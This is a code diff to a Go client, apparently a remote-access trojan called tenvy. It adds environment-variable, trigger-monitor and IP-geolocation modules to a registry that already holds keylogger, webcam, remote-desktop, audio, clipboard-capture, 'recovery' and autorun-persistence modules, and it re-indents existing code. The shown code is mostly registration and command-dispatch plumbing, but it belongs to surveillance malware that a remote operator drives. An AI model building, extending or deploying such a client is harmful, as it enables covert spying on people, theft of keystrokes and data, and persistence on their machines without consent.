@@ -19,13 +19,16 @@ import (
 	keyloggerctrl "github.com/rootbay/tenvy-client/internal/modules/control/keylogger"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
 	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
-        clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
-        filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
-        registrymgr "github.com/rootbay/tenvy-client/internal/modules/management/registry"
-        startupmgr "github.com/rootbay/tenvy-client/internal/modules/management/startup"
-        taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
-        tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
+	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
+	environmentmgr "github.com/rootbay/tenvy-client/internal/modules/management/environment"
+	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
+	registrymgr "github.com/rootbay/tenvy-client/internal/modules/management/registry"
+	startupmgr "github.com/rootbay/tenvy-client/internal/modules/management/startup"
+	taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
+	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
 	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
+	geolocationmgr "github.com/rootbay/tenvy-client/internal/modules/misc/geolocation"
+	triggermgr "github.com/rootbay/tenvy-client/internal/modules/misc/trigger"
 	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
 	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
@@ -271,13 +274,16 @@ func newDefaultModuleManager() *moduleManager {
 	registry.register(newAudioModule())
 	registry.register(newKeyloggerModule())
 	registry.register(newWebcamModule())
-        registry.register(newClipboardModule())
-        registry.register(newFileManagerModule())
-        registry.register(newRegistryModule())
-        registry.register(newStartupModule())
-        registry.register(newTaskManagerModule())
+	registry.register(newClipboardModule())
+	registry.register(newFileManagerModule())
+	registry.register(newRegistryModule())
+	registry.register(newEnvironmentModule())
+	registry.register(newStartupModule())
+	registry.register(newTaskManagerModule())
 	registry.register(newTCPConnectionsModule())
 	registry.register(newClientChatModule())
+	registry.register(newTriggerMonitorModule())
+	registry.register(newGeoModule())
 	registry.register(&recoveryModule{})
 	registry.register(newSystemInfoModule())
 	registry.register(newNotesModule())
@@ -1618,11 +1624,14 @@ var (
 	keyloggerModuleBaseCapabilities      = []string{"keylogger.stream", "keylogger.batch"}
 	webcamModuleBaseCapabilities         = []string{"webcam.enumerate", "webcam.stream"}
 	clipboardModuleBaseCapabilities      = []string{"clipboard.capture", "clipboard.push"}
-        fileManagerModuleBaseCapabilities    = []string{"file-manager.explore", "file-manager.modify"}
-        taskManagerModuleBaseCapabilities    = []string{"task-manager.list", "task-manager.control"}
+	fileManagerModuleBaseCapabilities    = []string{"file-manager.explore", "file-manager.modify"}
+	taskManagerModuleBaseCapabilities    = []string{"task-manager.list", "task-manager.control"}
 	tcpConnectionsModuleBaseCapabilities = []string{"tcp-connections.enumerate", "tcp-connections.control"}
 	clientChatModuleBaseCapabilities     = []string{"client-chat.persistent", "client-chat.alias"}
 	systemInfoModuleBaseCapabilities     = []string{"system-info.snapshot", "system-info.telemetry"}
+	environmentModuleBaseCapabilities    = []string{"environment.inspect", "environment.modify"}
+	triggerMonitorModuleBaseCapabilities = []string{"trigger-monitor.observe", "trigger-monitor.configure"}
+	geoModuleBaseCapabilities            = []string{"ip-geolocation.lookup", "ip-geolocation.providers"}
 )
 
 func newAudioModule() *audioModule                   { return &audioModule{} }
@@ -1630,9 +1639,12 @@ func newKeyloggerModule() *keyloggerModule           { return &keyloggerModule{}
 func newWebcamModule() *webcamModule                 { return &webcamModule{} }
 func newClipboardModule() *clipboardModule           { return &clipboardModule{} }
 func newFileManagerModule() *fileManagerModule       { return &fileManagerModule{} }
+func newEnvironmentModule() *environmentModule       { return &environmentModule{} }
 func newTaskManagerModule() *taskManagerModule       { return &taskManagerModule{} }
 func newTCPConnectionsModule() *tcpConnectionsModule { return &tcpConnectionsModule{} }
 func newClientChatModule() *clientChatModule         { return &clientChatModule{} }
+func newTriggerMonitorModule() *triggerMonitorModule { return &triggerMonitorModule{} }
+func newGeoModule() *geoModule                       { return &geoModule{} }
 func newSystemInfoModule() *systemInfoModule         { return &systemInfoModule{} }
 
 type audioModule struct {
@@ -2132,9 +2144,9 @@ func (m *clipboardModule) Shutdown(context.Context) error {
 }
 
 type fileManagerModule struct {
-        manager    *filemanager.Manager
-        extensions *moduleExtensionState
-        extOnce    sync.Once
+	manager    *filemanager.Manager
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *fileManagerModule) Metadata() ModuleMetadata {
@@ -2232,146 +2244,316 @@ func (m *fileManagerModule) Handle(ctx context.Context, cmd protocol.Command) er
 }
 
 func (m *fileManagerModule) Shutdown(context.Context) error {
-        // no teardown required for file system operations today
-        return nil
+	// no teardown required for file system operations today
+	return nil
 }
 
 type registryModule struct {
-        manager *registrymgr.Manager
+	manager *registrymgr.Manager
+}
+
+type environmentModule struct {
+	manager *environmentmgr.Manager
+}
+
+type triggerMonitorModule struct {
+	manager *triggermgr.Manager
+}
+
+type geoModule struct {
+	manager *geolocationmgr.Manager
 }
 
 func newRegistryModule() Module {
-        return &registryModule{}
+	return &registryModule{}
 }
 
 func (m *registryModule) Metadata() ModuleMetadata {
-        return ModuleMetadata{
-                ID:          "registry",
-                Title:       "Registry Manager",
-                Description: "Inspect and modify the Windows registry remotely.",
-                Commands:    []string{"registry"},
-                Capabilities: []ModuleCapability{
-                        {
-                                ID:          "registry.inspect",
-                                Name:        "registry.inspect",
-                                Description: "Enumerate registry hives, keys, and values.",
-                        },
-                        {
-                                ID:          "registry.modify",
-                                Name:        "registry.modify",
-                                Description: "Create, edit, and delete registry keys and values.",
-                        },
-                },
-        }
+	return ModuleMetadata{
+		ID:          "registry",
+		Title:       "Registry Manager",
+		Description: "Inspect and modify the Windows registry remotely.",
+		Commands:    []string{"registry"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "registry.inspect",
+				Name:        "registry.inspect",
+				Description: "Enumerate registry hives, keys, and values.",
+			},
+			{
+				ID:          "registry.modify",
+				Name:        "registry.modify",
+				Description: "Create, edit, and delete registry keys and values.",
+			},
+		},
+	}
 }
 
+func (m *environmentModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "environment-variables",
+		Title:       "Environment Variables",
+		Description: "List and modify environment variables on the host system.",
+		Commands:    []string{"environment-variables"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "environment.inspect",
+				Name:        "environment.inspect",
+				Description: "Enumerate current environment variables.",
+			},
+			{
+				ID:          "environment.modify",
+				Name:        "environment.modify",
+				Description: "Create, update, or remove environment variables.",
+			},
+		},
+	}
+}
+
+func (m *environmentModule) ID() string {
+	return "environment-variables"
+}
+
+func (m *environmentModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *environmentModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *environmentModule) configure(Config) error {
+	if m.manager == nil {
+		m.manager = environmentmgr.NewManager()
+	}
+	return nil
+}
+
+func (m *environmentModule) Handle(ctx context.Context, cmd protocol.Command) error {
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "environment subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+func (m *environmentModule) Shutdown(context.Context) error { return nil }
+
+func (m *triggerMonitorModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "trigger-monitor",
+		Title:       "Trigger Monitor",
+		Description: "Configure trigger telemetry collection cadence and content.",
+		Commands:    []string{"trigger-monitor"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "trigger-monitor.observe",
+				Name:        "trigger-monitor.observe",
+				Description: "Retrieve trigger monitor status and metrics.",
+			},
+			{
+				ID:          "trigger-monitor.configure",
+				Name:        "trigger-monitor.configure",
+				Description: "Update trigger monitor feed and collection parameters.",
+			},
+		},
+	}
+}
+
+func (m *triggerMonitorModule) ID() string { return "trigger-monitor" }
+
+func (m *triggerMonitorModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *triggerMonitorModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *triggerMonitorModule) configure(Config) error {
+	if m.manager == nil {
+		m.manager = triggermgr.NewManager()
+	}
+	return nil
+}
+
+func (m *triggerMonitorModule) Handle(ctx context.Context, cmd protocol.Command) error {
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "trigger monitor subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+func (m *triggerMonitorModule) Shutdown(context.Context) error { return nil }
+
+func (m *geoModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "ip-geolocation",
+		Title:       "IP Geolocation",
+		Description: "Resolve IP addresses to synthetic geographic metadata.",
+		Commands:    []string{"ip-geolocation"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "ip-geolocation.lookup",
+				Name:        "ip-geolocation.lookup",
+				Description: "Perform IP geolocation lookups via configured providers.",
+			},
+			{
+				ID:          "ip-geolocation.providers",
+				Name:        "ip-geolocation.providers",
+				Description: "Enumerate supported geolocation providers and defaults.",
+			},
+		},
+	}
+}
+
+func (m *geoModule) ID() string { return "ip-geolocation" }
+
+func (m *geoModule) Init(_ context.Context, cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *geoModule) UpdateConfig(cfg Config) error {
+	return m.configure(cfg)
+}
+
+func (m *geoModule) configure(Config) error {
+	if m.manager == nil {
+		m.manager = geolocationmgr.NewManager()
+	}
+	return nil
+}
+
+func (m *geoModule) Handle(ctx context.Context, cmd protocol.Command) error {
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "geolocation subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+}
+
+func (m *geoModule) Shutdown(context.Context) error { return nil }
+
 func (m *registryModule) ID() string {
-        return "registry"
+	return "registry"
 }
 
 func (m *registryModule) Init(_ context.Context, cfg Config) error {
-        return m.configure(cfg)
+	return m.configure(cfg)
 }
 
 func (m *registryModule) UpdateConfig(cfg Config) error {
-        return m.configure(cfg)
+	return m.configure(cfg)
 }
 
 func (m *registryModule) configure(cfg Config) error {
-        if m.manager == nil {
-                m.manager = registrymgr.NewManager(cfg.Logger)
-                return nil
-        }
-        m.manager.UpdateLogger(cfg.Logger)
-        return nil
+	if m.manager == nil {
+		m.manager = registrymgr.NewManager(cfg.Logger)
+		return nil
+	}
+	m.manager.UpdateLogger(cfg.Logger)
+	return nil
 }
 
 func (m *registryModule) Handle(ctx context.Context, cmd protocol.Command) error {
-        if m.manager == nil {
-                return WrapCommandResult(protocol.CommandResult{
-                        CommandID:   cmd.ID,
-                        Success:     false,
-                        Error:       "registry subsystem not initialized",
-                        CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-                })
-        }
-        return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "registry subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
 func (m *registryModule) Shutdown(context.Context) error {
-        return nil
+	return nil
 }
 
 type startupModule struct {
-        manager *startupmgr.Manager
+	manager *startupmgr.Manager
 }
 
 func newStartupModule() Module {
-        return &startupModule{}
+	return &startupModule{}
 }
 
 func (m *startupModule) Metadata() ModuleMetadata {
-        return ModuleMetadata{
-                ID:          "startup-manager",
-                Title:       "Startup Manager",
-                Description: "Enumerate and manage autorun persistence entries.",
-                Commands:    []string{"startup-manager"},
-                Capabilities: []ModuleCapability{
-                        {
-                                ID:          "startup.enumerate",
-                                Name:        "startup.enumerate",
-                                Description: "Enumerate autorun entries and associated telemetry.",
-                        },
-                        {
-                                ID:          "startup.manage",
-                                Name:        "startup.manage",
-                                Description: "Create, toggle, and remove autorun entries across scopes.",
-                        },
-                },
-        }
+	return ModuleMetadata{
+		ID:          "startup-manager",
+		Title:       "Startup Manager",
+		Description: "Enumerate and manage autorun persistence entries.",
+		Commands:    []string{"startup-manager"},
+		Capabilities: []ModuleCapability{
+			{
+				ID:          "startup.enumerate",
+				Name:        "startup.enumerate",
+				Description: "Enumerate autorun entries and associated telemetry.",
+			},
+			{
+				ID:          "startup.manage",
+				Name:        "startup.manage",
+				Description: "Create, toggle, and remove autorun entries across scopes.",
+			},
+		},
+	}
 }
 
 func (m *startupModule) ID() string {
-        return "startup-manager"
+	return "startup-manager"
 }
 
 func (m *startupModule) Init(_ context.Context, cfg Config) error {
-        return m.configure(cfg)
+	return m.configure(cfg)
 }
 
 func (m *startupModule) UpdateConfig(cfg Config) error {
-        return m.configure(cfg)
+	return m.configure(cfg)
 }
 
 func (m *startupModule) configure(cfg Config) error {
-        if m.manager == nil {
-                m.manager = startupmgr.NewManager(cfg.Logger)
-                return nil
-        }
-        m.manager.UpdateLogger(cfg.Logger)
-        return nil
+	if m.manager == nil {
+		m.manager = startupmgr.NewManager(cfg.Logger)
+		return nil
+	}
+	m.manager.UpdateLogger(cfg.Logger)
+	return nil
 }
 
 func (m *startupModule) Handle(ctx context.Context, cmd protocol.Command) error {
-        if m.manager == nil {
-                return WrapCommandResult(protocol.CommandResult{
-                        CommandID:   cmd.ID,
-                        Success:     false,
-                        Error:       "startup subsystem not initialized",
-                        CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
-                })
-        }
-        return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
+	if m.manager == nil {
+		return WrapCommandResult(protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "startup subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		})
+	}
+	return WrapCommandResult(m.manager.HandleCommand(ctx, cmd))
 }
 
 func (m *startupModule) Shutdown(context.Context) error {
-        return nil
+	return nil
 }
 
 type taskManagerModule struct {
-        manager    *taskmanager.Manager
-        extensions *moduleExtensionState
-        extOnce    sync.Once
+	manager    *taskmanager.Manager
+	extensions *moduleExtensionState
+	extOnce    sync.Once
 }
 
 func (m *taskManagerModule) Metadata() ModuleMetadata {
